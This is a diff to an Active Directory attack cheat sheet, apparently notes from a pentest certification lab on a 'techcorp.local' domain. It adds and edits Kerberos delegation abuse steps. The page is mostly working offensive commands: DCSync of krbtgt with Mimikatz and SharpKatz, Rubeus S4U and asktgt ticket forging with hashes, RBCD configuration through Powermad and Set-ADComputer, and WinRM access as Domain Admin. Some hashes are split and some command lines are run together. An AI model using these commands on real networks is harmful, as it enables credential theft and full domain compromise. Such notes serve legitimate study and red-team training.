@@ -251,10 +251,9 @@ After Step 6, the DC checks, if the User is marked as "Account is sensitive and 
 
 Using AD Module
 
-```powershell
-Get-ADComputer -Filter {TrustedForDelegation -eq $true}
-Get-AD-User -Filter {TrustedForDelegation -eq $true}
-```
+<pre class="language-powershell"><code class="lang-powershell"><strong>Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+</strong>Get-AD-User -Filter {TrustedForDelegation -eq $true}
+</code></pre>
 
 ❓ Elevated/System priv. required or high integrity process!
 
@@ -299,6 +298,8 @@ Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on anot
 
 Run DCSync
 Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User
+us\krbtgt --Domain us.techcorp.local --DomainController usdc.us.techcorp.local
 ```
 {% endcode %}
 
@@ -355,9 +356,11 @@ If result contains useraccountcontrol:Trusted_to_auth_for_delegation => this acc
 
 With ActiveDirectory Module
 
+{% code overflow="wrap" %}
 ```powershell
 Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
 ```
+{% endcode %}
 
 **❗Problem 1: Step 2, 3, 4 together (TGT & TGS) with Rubeus**
 
@@ -407,6 +410,44 @@ Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
 Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 ```
 
+### Kerberos Constrained Delegation - Kerberos Only
+
+* It requires an additional forwardable ticket to invoke S4U2Proxy.
+* We cannot use S4U2Self as the service doesn’t have TRUSTED\_TO\_AUTH\_FOR\_DELEGATION value configured.
+* We can leverage RBCD to abuse Kerberos Only configuration.
+  * Create a new Machine Account (Since ms-DS-MachineAccountQuota is set to 10 for all domain users, any domain user can create a new Machine Account and join the same in the current domain.)
+  * Configure RBCD on the machine configured with Constrained Delegation.
+  * Obtain a TGS/Service Ticket for the machine configured with Constrained Delegation by leveraging the newly created Machine Account.
+  * Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step.
+
+1. Enumerate constrained Delgation using ADModule
+
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+2. Create a new machine account using powermad.ps1
+
+. C:\AD\Tools\Powermad\Powermad.ps1 New-MachineAccount -MachineAccount studentcompX
+
+3. On a compromised machine with constrained delegation (us-mgmt) configure RBCD
+
+C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d7 4016ed51b2 /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap
+
+Set-ADComputer -Identity us-mgmt$ - PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose
+
+4. Obtain a TGS/Service Ticket for us-mgmt (machine configured with Constrained Delegation) by leveraging the newly created Machine Account (studentcompx).
+
+C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123 C:\AD\Tools\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$ /rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/usmgmt.us.techcorp.local /nowrap
+
+5. Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step
+
+C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e9 9e74d74016ed51b2 /msdsspn:cifs/usmssql.us.techcorp.local /altservice:http /nowrap /ptt
+
+6. Access the us-mssql using WinRM as the Domain Admin
+
+winrs -r:us-mssql.us.techcorp.local cmd.exe
+
+
+
 ## 🧷Kerberos Resource-based Constrained Delegation
 
 ### Description
@@ -417,10 +458,10 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 
 ### Requirement
 
-We need two privileges
+We need two privileges to abuse RBCD
 
-1. Control over an object which has SPN configured or set SPN (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
-2. Write permissions over the target service or object (ACL) to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
+1. Control over an object which has SPN configured or set SPN (like admin access to a domain joined machine or ability to join a machine to domain ms-DS-MachineAccountQuota is 10 for all domain users)
+2. GenericAll or GenericWrite permissions over the target service or object (ACL) to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
 
 ### Tool
 
@@ -440,6 +481,8 @@ Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 {% code overflow="wrap" %}
 ```powershell
 Set-DomainRBCD -Identity hostname-target-from-find-interesting-acl -DelegateFrom 'your-machine-account$' -Verbose
+
+Set-ADComputer -identity hostname-target-from-find-interesting-acl -PrincipalsAllowedToDelegateToAccount 'your-machine-account$'
 ```
 {% endcode %}
 
@@ -453,7 +496,7 @@ Invoke-mimikatz -command '"sekurlsa::ekeys"'
 
 {% code overflow="wrap" %}
 ```powershell
-rubeus.exe s4u /user:hostname$ /aes256:aes-hash-of-hostname /msdsspn:http/target-host /impersonateuser:administrator /ptt
+rubeus.exe s4u /user:hostname$ /aes256:aes-hash-of-hostname$-from-above /msdsspn:http/target-host /impersonateuser:administrator /ptt    
 
 Winrs -r:target-host
 ```
